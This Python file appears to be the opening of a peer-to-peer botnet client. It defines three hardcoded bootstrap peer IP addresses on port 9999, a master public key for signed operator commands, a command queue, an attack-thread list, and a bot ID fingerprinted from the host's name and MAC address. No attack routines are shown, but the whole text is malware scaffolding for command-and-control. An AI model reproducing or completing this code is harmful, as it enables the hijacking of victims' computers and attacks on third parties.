import queue
import threading
import hashlib
import uuid


# ============================================================
# CONFIG
# ============================================================

P2P_PORT = 9999

MASTER_PUBLIC_KEY = "235664217084a35a56e8f9a32fd9215607366e54d9c94d10ee21e33dd4638592"
REQUIRE_SIGNATURE = True

BOOTSTRAP_PEERS = [
    ("209.97.160.87", P2P_PORT),
    ("167.71.209.10", P2P_PORT),
    ("152.42.222.108", P2P_PORT),
]


# ============================================================
# GLOBALS (shared state)
# ============================================================

CMD_QUEUE = queue.Queue()
CMD_REF = {"version": 0, "cmd": {"type": "WAIT"}}
CMD_LOCK = threading.Lock()
ATTACK_THREADS = []
STOP_FLAG = threading.Event()
PEER_STATUS = {ip: {"port": port} for ip, port in BOOTSTRAP_PEERS}


def get_bot_id():
    try:
        import platform
        return hashlib.md5(f"{platform.node()}-{uuid.getnode()}".encode()).hexdigest()[:12]
    except:
        return str(uuid.uuid4())[:12]


BOT_ID = get_bot_id()
